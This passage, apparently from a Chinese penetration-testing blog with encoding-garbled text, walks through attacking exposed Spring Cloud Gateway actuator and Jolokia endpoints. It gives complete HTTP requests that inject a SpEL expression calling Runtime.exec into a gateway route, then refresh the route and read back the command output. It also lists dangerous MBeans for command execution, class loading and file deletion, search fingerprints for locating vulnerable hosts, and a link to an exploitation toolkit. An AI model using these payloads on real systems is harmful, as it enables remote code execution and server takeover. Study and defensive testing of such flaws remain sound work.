class="string">&quot;hacktest&quot;</span>,</span></span><br><span class="line"><span class="language-coffeescript">  <span class="string">&quot;filters&quot;</span>: [&#123;</span></span><br><span class="line"><span class="language-coffeescript">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;AddResponseHeader&quot;</span>,</span></span><br><span class="line"><span class="language-coffeescript">    <span class="string">&quot;args&quot;</span>: &#123;</span></span><br><span class="line"><span class="language-coffeescript">      <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Result&quot;</span>,</span></span><br><span class="line"><span class="language-coffeescript">      <span class="string">&quot;value&quot;</span>: <span class="string">&quot;<span class="subst">#&#123;<span class="keyword">new</span> <span class="built_in">String</span>(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(<span class="keyword">new</span> <span class="built_in">String</span>[]&#123;\<span class="string">&quot;id\&quot;&#125;).getInputStream()))&#125;&quot;</span></span></span></span></span><br><span class="line"><span class="subst"><span class="string"><span class="language-coffeescript">    &#125;</span></span></span></span><br><span class="line"><span class="string"><span class="language-coffeescript">  &#125;],</span></span></span><br><span class="line"><span class="string"><span class="language-coffeescript">  &quot;</span>uri<span class="string">&quot;: &quot;</span>http://example.com<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="language-coffeescript">&#125;</span></span></span><br><span class="line"><span class="string"><span class="language-coffeescript"></span></span></span><br></pre></td></tr></table></figure>

<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251111131937318.png" alt="image-20251111131937318"></p>
</li>
<li><p>åˆ·æ–°SCGç¼“å­˜</p>
 <figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/actuator/gateway/refresh</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8080</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>329</span><br><span class="line"></span><br><span class="line"><span class="language-coffeescript">&#123;</span></span><br><span class="line"><span class="language-coffeescript">  <span class="string">&quot;id&quot;</span>: <span class="string">&quot;hacktest&quot;</span>,</span></span><br><span class="line"><span class="language-coffeescript">  <span class="string">&quot;filters&quot;</span>: [&#123;</span></span><br><span class="line"><span class="language-coffeescript">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;AddResponseHeader&quot;</span>,</span></span><br><span class="line"><span class="language-coffeescript">    <span class="string">&quot;args&quot;</span>: &#123;</span></span><br><span class="line"><span class="language-coffeescript">      <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Result&quot;</span>,</span></span><br><span class="line"><span class="language-coffeescript">      <span class="string">&quot;value&quot;</span>: <span class="string">&quot;<span class="subst">#&#123;<span class="keyword">new</span> <span class="built_in">String</span>(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(<span class="keyword">new</span> <span class="built_in">String</span>[]&#123;\<span class="string">&quot;id\&quot;&#125;).getInputStream()))&#125;&quot;</span></span></span></span></span><br><span class="line"><span class="subst"><span class="string"><span class="language-coffeescript">    &#125;</span></span></span></span><br><span class="line"><span class="string"><span class="language-coffeescript">  &#125;],</span></span></span><br><span class="line"><span class="string"><span class="language-coffeescript">  &quot;</span>uri<span class="string">&quot;: &quot;</span>http://example.com<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="language-coffeescript">&#125;</span></span></span><br><span class="line"><span class="string"><span class="language-coffeescript"></span></span></span><br></pre></td></tr></table></figure>

<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251111131741403.png" alt="image-20251111131741403"></p>
</li>
<li><p>è®¿é—®æ³¨å†Œçš„è·¯ç”±</p>
 <figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/actuator/gateway/routes/hacktest</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8080</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251111131826279.png" alt="image-20251111131826279"></p>
</li>
</ol>
<h4 id="JAVA-Jolokia"><a href="#JAVA-Jolokia" class="headerlink" title="JAVA-Jolokia"></a>JAVA-Jolokia</h4><ol>
<li><p>Jolokia</p>
 <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Jolokia ==&gt; JVM MBean ==&gt; JVM</span><br><span class="line">1. JVMï¼šæ‰€æœ‰çš„javaä»£ç éƒ½éœ€è¦åœ¨JVMä¸­è¿è¡Œï¼Œä¹Ÿå°±æ˜¯è¯´ï¼šjavaä»£ç  -&gt; jvm -&gt; æœºå™¨ï¼›</span><br><span class="line">2. JVM MBeanï¼šJMXæ¡†æ¶ä¸­çš„ä¸€ä¸ªç»„ä»¶ï¼Œå¯ä»¥æ§åˆ¶JVMï¼Œå¯¹JVMè¿›è¡Œè¯»å–ã€å†™å…¥ã€æ‰§è¡Œç­‰æ“ä½œï¼›</span><br><span class="line">3. Jolokiaï¼šä¸€ä¸ªç‹¬ç«‹çš„å¼€æºjavaé¡¹ç›®ï¼Œæä¾›apiæ¥å—æ¥è‡ªäºhttpçš„æŒ‡ä»¤ï¼Œå¹¶ç¿»è¯‘æˆæ ‡å‡†çš„JVM MBeanå‘½ä»¤ï¼Œæœ€åä¸¢ç»™JVM MBeanã€‚è¡¥å……ï¼šå¯ä»¥è°ƒç”¨JVM MBeançš„ç»„ä»¶/å·¥å…·æœ‰å¾ˆå¤šï¼ŒJolokiaåªæ˜¯å…¶ä¸­ä¸€ä¸ªã€‚</span><br></pre></td></tr></table></figure>
</li>
<li><p>ç¼–å†™JVM MBeanå‘½ä»¤</p>
<ul>
<li><p>å®šä¹‰ 3 ä¸ª MBean æ¥å£</p>
  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// è®¢å•åˆ›å»ºç›‘æ§ MBean æ¥å£</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">OrderCreateMonitorMBean</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">getCreateCount</span><span class="params">()</span>; <span class="comment">// ä»Šæ—¥åˆ›å»ºè®¢å•æ•°</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è®¢å•æ”¯ä»˜ç›‘æ§ MBean æ¥å£</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">OrderPaymentMonitorMBean</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">getPaidCount</span><span class="params">()</span>;   <span class="comment">// ä»Šæ—¥æ”¯ä»˜è®¢å•æ•°</span></span><br><span class="line">    <span class="type">double</span> <span class="title function_">getTotalAmount</span><span class="params">()</span>; <span class="comment">// ä»Šæ—¥æ”¯ä»˜æ€»é‡‘é¢</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è®¢å•ç‰©æµç›‘æ§ MBean æ¥å£</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">OrderDeliveryMonitorMBean</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">getShippedCount</span><span class="params">()</span>; <span class="comment">// ä»Šæ—¥å·²å‘è´§è®¢å•æ•°</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>å®ç°MBeanæ¥å£</p>
  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// è®¢å•åˆ›å»ºç›‘æ§å®ç°ç±»</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OrderCreateMonitor</span> <span class="keyword">implements</span> <span class="title class_">OrderCreateMonitorMBean</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">createCount</span> <span class="operator">=</span> <span class="number">1500</span>; <span class="comment">// æ¨¡æ‹Ÿä»Šæ—¥åˆ›å»º1500å•</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getCreateCount</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> createCount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è®¢å•æ”¯ä»˜ç›‘æ§å®ç°ç±»</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OrderPaymentMonitor</span> <span class="keyword">implements</span> <span class="title class_">OrderPaymentMonitorMBean</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">paidCount</span> <span class="operator">=</span> <span class="number">1200</span>; <span class="comment">// æ¨¡æ‹Ÿä»Šæ—¥æ”¯ä»˜1200å•</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> <span class="variable">totalAmount</span> <span class="operator">=</span> <span class="number">256000.0</span>; <span class="comment">// æ¨¡æ‹Ÿæ€»é‡‘é¢</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getPaidCount</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> paidCount;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">getTotalAmount</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> totalAmount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è®¢å•ç‰©æµç›‘æ§å®ç°ç±»</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OrderDeliveryMonitor</span> <span class="keyword">implements</span> <span class="title class_">OrderDeliveryMonitorMBean</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">shippedCount</span> <span class="operator">=</span> <span class="number">900</span>; <span class="comment">// æ¨¡æ‹Ÿä»Šæ—¥å‘è´§900å•</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getShippedCount</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> shippedCount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>æ³¨å†ŒMBeanåˆ°ä¸€ä¸ªåŸŸï¼ˆç»„ï¼‰&#x2F;ç”ŸæˆMBeanå‘½ä»¤ï¼šæœ¬è´¨å°±æ˜¯å®ä¾‹åŒ–å¯¹è±¡ï¼Œå¹¶ç»™è¿™ä¸ªå®ä¾‹æŒ‰ç…§è§„èŒƒç»‘å®šä¸€ä¸ªåç§°è®©MBeanServerè®°ä½ã€‚</p>
  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.management.ObjectName;</span><br><span class="line"><span class="keyword">import</span> java.lang.management.ManagementFactory;</span><br><span class="line"><span class="keyword">import</span> javax.management.MBeanServer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MultiMBeanRegistration</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">MBeanServer</span> <span class="variable">mbeanServer</span> <span class="operator">=</span> ManagementFactory.getPlatformMBeanServer();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. æ³¨å†Œè®¢å•åˆ›å»ºç›‘æ§ MBean</span></span><br><span class="line">        <span class="type">ObjectName</span> <span class="variable">createMonitorName</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectName</span>(</span><br><span class="line">            <span class="string">&quot;com.example.order:type=CreateMonitor,module=order-service,version=2.1&quot;</span></span><br><span class="line">        );</span><br><span class="line">        mbeanServer.registerMBean(<span class="keyword">new</span> <span class="title class_">OrderCreateMonitor</span>(), createMonitorName);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. æ³¨å†Œè®¢å•æ”¯ä»˜ç›‘æ§ MBeanï¼ˆåŒä¸€åŸŸï¼Œä¸åŒ typeï¼‰</span></span><br><span class="line">        <span class="type">ObjectName</span> <span class="variable">paymentMonitorName</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectName</span>(</span><br><span class="line">            <span class="string">&quot;com.example.order:type=PaymentMonitor,module=payment-service,version=2.1&quot;</span></span><br><span class="line">        );</span><br><span class="line">        mbeanServer.registerMBean(<span class="keyword">new</span> <span class="title class_">OrderPaymentMonitor</span>(), paymentMonitorName);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. æ³¨å†Œè®¢å•ç‰©æµç›‘æ§ MBeanï¼ˆåŒä¸€åŸŸï¼Œä¸åŒ typeï¼‰</span></span><br><span class="line">        <span class="type">ObjectName</span> <span class="variable">deliveryMonitorName</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectName</span>(</span><br><span class="line">            <span class="string">&quot;com.example.order:type=DeliveryMonitor,module=logistics-service,version=2.1&quot;</span></span><br><span class="line">        );</span><br><span class="line">        mbeanServer.registerMBean(<span class="keyword">new</span> <span class="title class_">OrderDeliveryMonitor</span>(), deliveryMonitorName);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;3ä¸ªMBeanæ³¨å†ŒæˆåŠŸï¼ˆåŒä¸€åŸŸï¼šcom.example.orderï¼‰ï¼š&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;- &quot;</span> + createMonitorName);</span><br><span class="line">        System.out.println(<span class="string">&quot;- &quot;</span> + paymentMonitorName);</span><br><span class="line">        System.out.println(<span class="string">&quot;- &quot;</span> + deliveryMonitorName);</span><br><span class="line">        Thread.sleep(Long.MAX_VALUE); <span class="comment">// ä¿æŒè¿è¡Œ</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>MBeanåç§°åˆ†æ</p>
  <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">MBeanåç§°ï¼šç»„å/åŸŸå:&lt;key=value&gt;ï¼Œ</span><br><span class="line">1. ä¸ºä»€ä¹ˆè¦æœ‰ç»„åï¼šå› ä¸ºæœ‰å¾ˆå¤šçš„MBeanè¦æ³¨å†Œéƒ½MBeanServerä¸­ï¼Œé€šè¿‡ç»„ç®¡ç†èµ·æ¥æ›´åŠ æ–¹ä¾¿ï¼›</span><br><span class="line">2. &lt;key=value&gt;ä½œç”¨ï¼šå¯ä»¥ç†è§£ä¸ºç»™æŸä¸ªå®ä¾‹å–å¾—åˆ«åï¼Œè‡³äºä¸ºä»€ä¹ˆæ˜¯è¿™ç§å½¢å¼ï¼Œéœ€è¦é—®åŸä½œè€…ã€‚è¿™é‡Œçš„keyå®˜æ–¹æ²¡æœ‰å¼ºåˆ¶è§„å®šå«ä»€ä¹ˆåå­—ï¼Œä¸šå†…ä¸€èˆ¬ä¼šè¿™æ ·å†™ï¼štype=ç±»å</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>POSTè®¿é—®jolokiaæ¥å£ï¼ˆä¹Ÿå¯ä»¥GETè®¿é—®ï¼‰ï¼Œè°ƒç”¨MBeanå‘½ä»¤</p>
<ul>
<li><p>è°ƒç”¨è®¢å•åˆ›å»ºç›‘æ§ MBeanï¼ˆè·å–ä»Šæ—¥åˆ›å»ºè®¢å•æ•°ï¼‰</p>
  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line">curl -X POST http:<span class="comment">//localhost:8080/jolokia/ \</span></span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">    &quot;type&quot;: &quot;read&quot;,</span></span><br><span class="line"><span class="string">    &quot;mbean&quot;: &quot;com.example.order:type=CreateMonitor,module=order-service,version=2.1&quot;,</span></span><br><span class="line"><span class="string">    &quot;attribute&quot;: &quot;CreateCount&quot;</span></span><br><span class="line"><span class="string">  &#125;&#x27;</span></span><br><span class="line">      </span><br><span class="line">      </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  &quot;mbean&quot;: &quot;com.example.order:type=CreateMonitor,module=order-service,version=2.1&quot;  ç†è§£ä¸ºnew OrderCreateMonitor()è¿™ä¸ªå®ä¾‹</span></span><br><span class="line"><span class="comment">  &quot;type&quot;: &quot;read&quot;  ç†è§£ä¸ºè°ƒç”¨è¿™ä¸ªå®ä¾‹ä¸­çš„getteræ–¹æ³•</span></span><br><span class="line"><span class="comment">  &quot;attribute&quot;: &quot;CreateCount&quot;  è¡¨ç¤ºgetterå“ªä¸€ä¸ª</span></span><br><span class="line"><span class="comment">  è¿™ä¸‰éƒ¨åˆ†ç»“åˆèµ·æ¥å°±æ˜¯ï¼šnew OrderCreateMonitor().getCreateCount()</span></span><br><span class="line"><span class="comment">  </span></span><br><span class="line"><span class="comment">**/</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>è°ƒç”¨è®¢å•æ”¯ä»˜ç›‘æ§ MBeanï¼ˆè·å–ä»Šæ—¥æ”¯ä»˜æ€»é‡‘é¢ï¼‰</p>
  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line">curl -X POST http:<span class="comment">//localhost:8080/jolokia/ \</span></span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">    &quot;type&quot;: &quot;read&quot;,</span></span><br><span class="line"><span class="string">    &quot;mbean&quot;: &quot;com.example.order:type=PaymentMonitor,module=payment-service,version=2.1&quot;,</span></span><br><span class="line"><span class="string">    &quot;attribute&quot;: &quot;TotalAmount&quot;</span></span><br><span class="line"><span class="string">  &#125;&#x27;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>æ‰¹é‡è·å–å¤šä¸ª MBean å±æ€§</p>
  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line">curl -X POST http:<span class="comment">//localhost:8080/jolokia/ \</span></span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;[</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">      &quot;type&quot;: &quot;read&quot;,</span></span><br><span class="line"><span class="string">      &quot;mbean&quot;: &quot;com.example.order:type=CreateMonitor,module=order-service,version=2.1&quot;,</span></span><br><span class="line"><span class="string">      &quot;attribute&quot;: &quot;CreateCount&quot;,</span></span><br><span class="line"><span class="string">      &quot;id&quot;: &quot;1&quot;</span></span><br><span class="line"><span class="string">    &#125;,</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">      &quot;type&quot;: &quot;read&quot;,</span></span><br><span class="line"><span class="string">      &quot;mbean&quot;: &quot;com.example.order:type=DeliveryMonitor,module=logistics-service,version=2.1&quot;,</span></span><br><span class="line"><span class="string">      &quot;attribute&quot;: &quot;ShippedCount&quot;,</span></span><br><span class="line"><span class="string">      &quot;id&quot;: &quot;2&quot;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">  ]&#x27;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>POSTè®¿é—®jolokia apiè¯·æ±‚ä½“æ ¼å¼è§£æ</p>
  <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">typeï¼šæ“ä½œç±»å‹ï¼ˆå¿…é€‰ï¼‰ï¼Œå¸¸è§å€¼ä¸ºreadï¼ˆè¯»å±æ€§ï¼‰ã€writeï¼ˆå†™å±æ€§ï¼‰ã€execï¼ˆè°ƒç”¨æ–¹æ³•ï¼‰</span><br><span class="line">mbeanï¼šMBean çš„å…¨åï¼ˆå¿…é€‰ï¼‰ï¼Œæ ¼å¼ä¸ºåŸŸå:é”®=å€¼[,é”®=å€¼]ï¼ˆå¦‚java.lang:type=Memoryï¼‰</span><br><span class="line">attributeï¼šå±æ€§åï¼ˆè¯»/å†™å±æ€§æ—¶å¿…é€‰ï¼‰ï¼Œæ”¯æŒå•ä¸ªå±æ€§ï¼ˆå­—ç¬¦ä¸²ï¼‰æˆ–å¤šä¸ªå±æ€§ï¼ˆæ•°ç»„ï¼‰</span><br><span class="line">valueï¼šå±æ€§å€¼ï¼ˆå†™å±æ€§æ—¶å¿…é€‰ï¼‰ï¼Œéœ€ä¸å±æ€§ç±»å‹åŒ¹é…ï¼ˆå¦‚æ•°å­—ã€å­—ç¬¦ä¸²ã€å¸ƒå°”å€¼ï¼‰</span><br><span class="line">operationï¼šæ–¹æ³•åï¼ˆè°ƒç”¨æ–¹æ³•æ—¶å¿…é€‰ï¼‰</span><br><span class="line">argumentsï¼šæ–¹æ³•å‚æ•°ï¼ˆè°ƒç”¨å¸¦å‚æ–¹æ³•æ—¶å¿…é€‰ï¼‰ï¼Œæ•°ç»„å½¢å¼ï¼Œé¡ºåºä¸æ–¹æ³•å‚æ•°ä¸€è‡´</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>å†…ç½®çš„ä¸€äº›é«˜å±MBeanå‘½ä»¤ï¼Œæ€ä¹ˆé€šè¿‡jolokia apiè°ƒç”¨ï¼Œç”¨çš„æ—¶å€™é—®AI</p>
 <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1. javax.management.loading:type=DefaultLoaderRepository</span><br><span class="line">    å±é™©æ“ä½œï¼šloadClass æˆ– loadClassWithoutBind æ–¹æ³•</span><br><span class="line">    ä½œç”¨ï¼šåŠ è½½å¤–éƒ¨ç±»å­—èŠ‚ç åˆ° JVMã€‚</span><br><span class="line">    é£é™©ï¼šè‹¥æ”»å‡»è€…å¯æ§ç±»å­—èŠ‚ç ï¼ˆå¦‚åŒ…å«æ¶æ„é™æ€ä»£ç å—æˆ–æ–¹æ³•ï¼‰ï¼Œå¯æ‰§è¡Œä»»æ„ä»£ç ï¼ˆå¦‚å‘½ä»¤æ‰§è¡Œã€æ–‡ä»¶è¯»å†™ï¼‰ã€‚</span><br><span class="line">2. com.sun.management:type=DiagnosticCommand</span><br><span class="line">    å±é™©æ“ä½œï¼švmCommand æˆ–å…·ä½“å‘½ä»¤æ–¹æ³•ï¼ˆå¦‚ executeï¼‰</span><br><span class="line">    ä½œç”¨ï¼šæ‰§è¡Œ JVM è¯Šæ–­å‘½ä»¤ï¼ˆå¦‚ jmapã€jstack ç­‰æ•ˆåŠŸèƒ½ï¼‰ã€‚</span><br><span class="line">    é£é™©ï¼šéƒ¨åˆ†å‘½ä»¤å¯è¯»å–è¿›ç¨‹å†…å­˜ã€çº¿ç¨‹ä¿¡æ¯ï¼Œç”šè‡³åœ¨ç‰¹å®š JDK ç‰ˆæœ¬ä¸­é€šè¿‡å‚æ•°æ³¨å…¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</span><br><span class="line">3. java.lang:type=Runtime</span><br><span class="line">    å±é™©æ“ä½œï¼šexec(String command) æ–¹æ³•</span><br><span class="line">    ä½œç”¨ï¼šç›´æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼ˆå¦‚ lsã€rmã€bash ç­‰ï¼‰ã€‚</span><br><span class="line">    é£é™©ï¼šæœ€ç›´æ¥çš„å‘½ä»¤æ‰§è¡Œå…¥å£ï¼Œè‹¥å¯è°ƒç”¨ï¼Œæ”»å‡»è€…å¯å®Œå…¨æ§åˆ¶æœåŠ¡å™¨ã€‚</span><br><span class="line">4. java.nio:type=FileSystemï¼ˆéƒ¨åˆ† JDK å®ç°ï¼‰</span><br><span class="line">    å±é™©æ“ä½œï¼šcreateFileã€deleteFileã€write ç­‰æ–‡ä»¶æ“ä½œæ–¹æ³•</span><br><span class="line">    é£é™©ï¼šè¯»å†™ / åˆ é™¤æœåŠ¡å™¨ä»»æ„æ–‡ä»¶ï¼ˆå¦‚ /etc/passwdã€åº”ç”¨é…ç½®æ–‡ä»¶ï¼‰ã€‚</span><br><span class="line">5. java.lang:type=ClassLoading</span><br><span class="line">    å±é™©æ“ä½œï¼šsetClassPath æ–¹æ³•</span><br><span class="line">    ä½œç”¨ï¼šä¿®æ”¹ JVM ç±»åŠ è½½è·¯å¾„ã€‚</span><br><span class="line">    é£é™©ï¼šåŠ è½½æ¶æ„ JAR åŒ…ï¼Œè§¦å‘ä»£ç æ‰§è¡Œã€‚</span><br><span class="line">6. Tomcatï¼šCatalina:type=Manager</span><br><span class="line">	å±é™©æ“ä½œï¼šlistSessionï¼ˆè·å–ä¼šè¯ä¿¡æ¯ï¼‰ã€expireSessionï¼ˆé”€æ¯ä¼šè¯ï¼‰ï¼Œç»“åˆå…¶ä»–æ¼æ´å¯è¶Šæƒã€‚</span><br><span class="line">7. Spring Bootï¼šorg.springframework.boot:type=Admin,name=SpringApplication</span><br><span class="line">	å±é™©æ“ä½œï¼šshutdown æ–¹æ³•ï¼ˆç›´æ¥å…³é—­åº”ç”¨ï¼‰ã€‚</span><br><span class="line">8. JBoss/Wildflyï¼šjboss.system:type=ServerInfo</span><br><span class="line">	å±é™©æ“ä½œï¼šlistDeployments ç»“åˆéƒ¨ç½²æ¥å£å¯ä¸Šä¼ æ¶æ„ WAR åŒ…ã€‚</span><br></pre></td></tr></table></figure>
</li>
<li><p>èµ„äº§å®šä½</p>
 <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">body=&quot;\&quot;request\&quot;:&#123;\&quot;mbean\&quot;&quot; || body=&quot;\&quot;status\&quot;:200&quot; &amp;&amp; body=&quot;jolokia&quot;</span><br><span class="line">header=&quot;X-Jolokia-Version&quot; || (header=&quot;Content-Type: application/json&quot; &amp;&amp; body=&quot;/jolokia&quot;)</span><br><span class="line">body=&quot;\&quot;error_type\&quot;:\&quot;javax.management\&quot;&quot; &amp;&amp; body=&quot;/jolokia&quot;</span><br></pre></td></tr></table></figure>
</li>
<li><p>åˆ©ç”¨å·¥å…·ï¼š<a href="https://github.com/laluka/jolokia-exploitation-toolkit">https://github.com/laluka/jolokia-exploitation-toolkit</a></p>
</li>
</ol>
<h3 id="äº§å“æ¼æ´"><a href="#äº§å“æ¼æ´" class="headerlink" title="äº§å“æ¼æ´"></a>äº§å“æ¼æ´</h3><h4 id="OpenApi"><a href="#OpenApi" class="headerlink" title="OpenApi"></a>OpenApi</h4><ol>
